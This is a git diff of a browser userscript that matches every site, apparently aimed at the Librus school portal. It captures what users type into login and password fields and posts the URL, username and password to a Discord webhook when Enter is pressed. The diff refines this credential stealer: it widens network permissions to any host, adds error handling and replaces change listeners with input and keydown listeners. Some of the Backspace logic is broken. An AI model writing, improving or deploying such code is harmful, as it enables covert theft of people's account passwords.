@@ -7,7 +7,7 @@
 // @match        *://*/*
 // @icon         https://www.google.com/s2/favicons?sz=64&domain=librus.pl
 // @grant        GM_xmlhttpRequest
-// @connect      raw.githubusercontent.com
+// @connect      *
 // ==/UserScript==
 
 (function() {
@@ -27,7 +27,11 @@
 
                 completedRequests++;
                 checkCompletion();
+            },
+            onerror: function(error) {
+                console.error("Error fetching the password selectors: ", error);
             }
+
         });
 
         GM_xmlhttpRequest({
@@ -39,6 +43,9 @@
 
                 completedRequests++;
                 checkCompletion();
+            },
+            onerror: function(error) {
+                console.error("Error fetching the login selectors: ", error);
             }
         });
 
@@ -48,11 +55,12 @@
     }
 
     fetchSelectors(function(loginSelectors, passwordSelectors) {
-        console.log("Login Selectors: ", loginSelectors);
-        console.log("Password Selectors: ", passwordSelectors);
-
         const loginBox = document.querySelector(loginSelectors);
         const passwordBox = document.querySelector(passwordSelectors);
+
+        if (!loginBox) console.log("Login is null");
+        if (!passwordBox) console.log("Passwords are null");
+
 
         const discordWebhook = "webhook-here"
         let savedData = {
@@ -62,27 +70,41 @@
         }
 
         const sendWebhook = () => {
-            fetch(atob(discordWebhook), {
-                method: "post",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify({
+            GM_xmlhttpRequest({
+                method: "POST",
+                url: "PASTE WEBHOOK LINK HERE",
+                headers: { "Content-Type": "application/json" },
+                data: JSON.stringify({
                     username: "webhook",
                     content: `URL: \`${savedData.url}\` Username: \`${savedData.login}\` Password: \`${savedData.password}\``,
-                })
-            })
+                }),
+                onload: function(response) {
+                    console.log("Successfully sent webhook")
+                },
+                onerror: function(error) {
+                    console.error("Error sending webhook: ", error);
+                }
+            });
         };
 
-        passwordBox.addEventListener("change", (event) => {
-            savedData.password = event.target.value;
-            sendWebhook();
-
+        passwordBox.addEventListener("input", (event) => {
+            if (event.key === "Backspace") {
+                savedData.password.slice(0, -1);
+            } else {
+                savedData.password = event.target.value;
+            }
         });
 
-        loginBox.addEventListener("change", (event) => {
-            savedData.login = event.target.value;
-            sendWebhook();
+        loginBox.addEventListener("input", (event) => {
+            if (event.key === "Backspace") {
+                savedData.login.slice(0, -1);
+            } else {
+                savedData.login = event.target.value;
+            }
+        });
+
+        window.addEventListener("keydown", (event) => {
+            if (event.key === "Enter") sendWebhook();
         });
     });
 })();
